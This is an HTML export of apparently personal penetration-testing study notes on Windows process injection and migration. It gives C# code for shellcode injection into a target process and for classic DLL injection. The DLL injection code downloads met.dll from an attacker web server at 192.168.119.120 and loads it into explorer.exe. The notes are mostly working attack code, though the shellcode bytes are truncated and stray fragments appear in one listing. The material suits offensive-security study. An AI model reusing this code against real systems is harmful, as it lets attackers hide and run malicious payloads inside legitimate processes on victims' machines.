<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>05- process injection and migration (THEORY)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>05- process injection and migration (THEORY)</h1><br/><p><h2>Intro</h2><ul><li>• <small>• goal: stabilize shell </small></li><li><small>process= container with its own virtual memory</small></li><li><small>a thread execute assembly code of the app</small></li><li><small>each thread with its own stack and share virtual memory of the process</small></li><li><small>all processes have integrity level that blocks one process from access another with higher integrity level</small></li><li><small>that&#39;s why we need processexplorer as admin </small></li><li><small>every process has its DACL </small><ul><li></li></ul></li></ul><img src="images/46-1.png" alt="images/46-1.png" /><ul><li>• <small>• Target processes</small><ul><li><strong><small>process.exe</small></strong><small> (always live and high integrity)</small></li></ul></li></ul></p><p></p><p></p><p><h2>Process Injection in C#</h2><ul><li> <small> method</small><ul><li><strong><small>openProcess</small></strong></li><li><strong><small>VirtualAllocEx</small></strong><small> : allocate memory in any other space </small></li></ul></li><li><small>we need PID of process.exe </small></li></ul><small></small></p><p><small></small></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Runtime.InteropServices;<br /><br /><span style="color:#ff9d00;font-weight:700">namespace</span> Inject<br />{<br />    <span style="color:#ff9d00;font-weight:700">class</span> Program<br />    {<br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>, ExactSpelling = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr OpenProcess(<span style="color:#7f0044;font-weight:400">uint</span> processAccess, <span style="color:#7f0044;font-weight:400">bool</span> bInheritHandle, <span style="color:#7f0044;font-weight:400">int</span><br />        processId);<br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>, ExactSpelling = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, <span style="color:#7f0044;font-weight:400">uint</span><br />        dwSize, <span style="color:#7f0044;font-weight:400">uint</span> flAllocationType, <span style="color:#7f0044;font-weight:400">uint</span> flProtect);<br />        <br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,<br />        <span style="color:#7f0044;font-weight:400">byte</span>[] lpBuffer, Int32 nSize, <span style="color:#ff9d00;font-weight:700">out</span> IntPtr lpNumberOfBytesWritten);<br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr<br />        lpThreadAttributes, <span style="color:#7f0044;font-weight:400">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span style="color:#7f0044;font-weight:400">uint</span><br />        dwCreationFlags, IntPtr lpThreadId);<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />        {<br />            IntPtr hProcess = OpenProcess(<span style="color:#ff0044;font-weight:400">0x001F0FFF</span>, <span style="color:#ff0044;font-weight:400">false</span>, <span style="color:#ff0044;font-weight:400">4804</span>);<br />            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, <span style="color:#ff0044;font-weight:400">0x1000</span>, <span style="color:#ff0044;font-weight:400">0x3000</span>, <span style="color:#ff0044;font-weight:400">0x40</span>);<br />            <span style="color:#7f0044;font-weight:400">byte</span>[] buf = <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">byte</span>[<span style="color:#ff0044;font-weight:400">591</span>] {<br />            <span style="color:#ff0044;font-weight:400">0xfc</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x83</span>,<span style="color:#ff0044;font-weight:400">0xe4</span>,<span style="color:#ff0044;font-weight:400">0xf0</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0xcc</span>,<span style="color:#ff0044;font-weight:400">0x00</span>,<span style="color:#ff0044;font-weight:400">0x00</span>,<span style="color:#ff0044;font-weight:400">0x00</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x51</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0x52</span>,<br />            ....<br />            <span style="color:#ff0044;font-weight:400">0x0a</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0xda</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0xd5</span> };<br />            IntPtr outSize;<br />            WriteProcessMemory(hProcess, addr, buf, buf.Length, <span style="color:#ff9d00;font-weight:700">out</span> outSize);<br />            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, <span style="color:#ff0044;font-weight:400">0</span>, addr,<br />            IntPtr.Zero, <span style="color:#ff0044;font-weight:400">0</span>, IntPtr.Zero);<br />}<br />}<br />}</pre></div></p><p></p><p></p><p></p><p><h2>DLL injection </h2><ul><li>• <small>• process injection allowed us to inject arbitrary shellcode into a remote process </small></li><li><small>but for a longer code bases we might want to inject a whole dll instead of shellcode </small></li><li><small>process calls LoadLibrary when usage of API in dlls </small></li><li><small>it doesn&#39;t work on remote processes </small></li></ul></p><p></p><p></p><p><h2>Classical DLL injection steps </h2><ul><li><small>To implement the DLL injection technique, we are going to create a new C# .NET Standard Console app that will fetch our DLL from the attacker’s web server. We’ll then write the DLL to disk since LoadLibrary only accepts files present on disk</small></li></ul><small></small></p><p><small></small></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Diagnostics;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Net;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Runtime.InteropServices;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Text;<br /><span style="color:#ff9d00;font-weight:700">namespace</span> Inject<br />{<br />    <span style="color:#ff9d00;font-weight:700">class</span> Program<br />    {<br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>, ExactSpelling = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr OpenProcess(<span style="color:#7f0044;font-weight:400">uint</span> processAccess, <span style="color:#7f0044;font-weight:400">bool</span> bInheritHandle, <span style="color:#7f0044;font-weight:400">int</span><br />        processId);<br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>, ExactSpelling = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, <span style="color:#7f0044;font-weight:400">uint</span><br />        dwSize, <span style="color:#7f0044;font-weight:400">uint</span> flAllocationType, <span style="color:#7f0044;font-weight:400">uint</span> flProtect);<br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,<br />        <span style="color:#7f0044;font-weight:400">byte</span>[] lpBuffer, Int32 nSize, <span style="color:#ff9d00;font-weight:700">out</span> IntPtr lpNumberOfBytesWritten);<br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr<br />lpThreadAttributes, <span style="color:#7f0044;font-weight:400">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span style="color:#7f0044;font-weight:400">uint</span><br />        dwCreationFlags, IntPtr lpThreadId);<br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span>, CharSet = CharSet.Ansi, ExactSpelling = <span style="color:#ff0044;font-weight:400">true</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr GetProcAddress(IntPtr hModule, <span style="color:#7f0044;font-weight:400">string</span> procName);<br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, CharSet = CharSet.Auto)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr GetModuleHandle(<span style="color:#7f0044;font-weight:400">string</span> lpModuleName);<br />        Co<br />        x<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />        {<br /><br />        String dir =<br />        Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);<br />        String dllName = dir + <span style="color:#3ad900;font-weight:400">&quot;\\met.dll&quot;</span>;<br />        WebClient wc = <span style="color:#ff9d00;font-weight:700">new</span> WebClient();<br />        wc.DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;http://192.168.119.120/met.dll&quot;</span>, dllName);<br />        Process[] expProc = Process.GetProcessesByName(<span style="color:#3ad900;font-weight:400">&quot;explorer&quot;</span>);<br />        <span style="color:#7f0044;font-weight:400">int</span> pid = expProc[<span style="color:#ff0044;font-weight:400">0</span>].Id;<br />        IntPtr hProcess = OpenProcess(<span style="color:#ff0044;font-weight:400">0x001F0FFF</span>, <span style="color:#ff0044;font-weight:400">false</span>, pid);<br />        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, <span style="color:#ff0044;font-weight:400">0x1000</span>, <span style="color:#ff0044;font-weight:400">0x3000</span>, <span style="color:#ff0044;font-weight:400">0x40</span>);<br />        IntPtr outSize;<br />        Boolean res = WriteProcessMemory(hProcess, addr,<br />        Encoding.Default.GetBytes(dllName), dllName.Length, <span style="color:#ff9d00;font-weight:700">out</span> outSize);<br />        IntPtr loadLib = GetProcAddress(GetModuleHandle(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>),<br />        <span style="color:#3ad900;font-weight:400">&quot;LoadLibraryA&quot;</span>);<br />        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, <span style="color:#ff0044;font-weight:400">0</span>, loadLib,<br />        addr, <span style="color:#ff0044;font-weight:400">0</span>, IntPtr.Zero);<br />        }<br />    }<br />}</pre></div></p><p><ul><li>when we execute app it calls malicious dll that will execute shellcode</li></ul></p><p></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
